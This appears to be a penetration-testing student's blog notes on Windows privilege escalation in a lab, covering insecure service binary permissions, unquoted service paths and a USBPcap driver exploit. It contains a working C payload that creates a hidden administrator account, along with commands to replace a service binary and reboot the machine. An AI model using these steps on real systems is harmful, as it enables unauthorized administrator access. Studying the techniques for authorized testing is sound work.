---
title: Study Notes - 2021/05/08
date: 2021-05-08 21:15:20
tags: [Penetration Testing, Study Notes]
---


# Insecure File permission 
system service binary has insecure permission, we can replace the binary, when the system reboot, the malicious binary will be executed with root permission  

## Use powershell to list running servicis 
```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```
Service stored in Program Files dir is more prone to have insecure permission 

## Ennumerate the permission of target service
```
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
```

## replace the binary with malicious binary  
```
#include <stdlib.h>
int main ()
{
    int i;
    i = system ("net user evil Ev!lpass /add");
    i = system ("net localgroup administrators evil /add");
}
```

cross compile it `i686-w64-mingw32-gcc adduser.c -o adduser.exe`  

```
move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
```

## restart the service 
```
C:\Users\student> net stop Serviio
System error 5 has occurred.
Access is denied.
```
## check the start option of the service 
``
C:\Users\student>wmic service where caption="Serviio" get name, caption, state,
startmode
Caption Name StartMode State
Serviio Serviio Auto Running`
``

check if user can reboot the system 
```
C:\Users\student>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ==================================== ========
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled
```
disable means the privilege is not enabled for the running process, in our case whoami

## reboot the machine 
```
shutdown \r \t 0   
```
\r reboot, \t in 0 sec  


## log in with new evil account
```
rdesktop xx.xx.xx.xx -u evil -p `password` -g 1024x768 
```

check if the new user in admin group 
```
net localgroup Administrators
```



# Leveraging Unquoted service path  
can be used in lab 10.11.0.23  -u n00b -p lab

When using file/dir path contain spaces, the developer should make sure it is quoted
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

move adduser.exe "C:\Program Files\My Program\My.exe"
```


# Windows Kernel Vulnerabilities: USBPcap Case Study 
determine the version and architecture
```
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1 Build 7601
System Type: X86-based PC
```

try to find third-party driver vulnerabiliies first  

## enumerate the driver 
```
driverquery /v
```
/v for verbose output  
looking for third-party drivers

## search for exploit 
```
searchsploit USBPcap
```

## check the version of USBPCap
To begin, we will list the contents of the Program Files directory, in search of the USBPcap directory:  
```
cd "C:\Program Files"
dir 
type USBPcap.inf
```

## Compile C/C++ on windows
Use the client machine  
setup PATH environment variable 
```
C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
gcc 41452.c -o exploit.exe
```






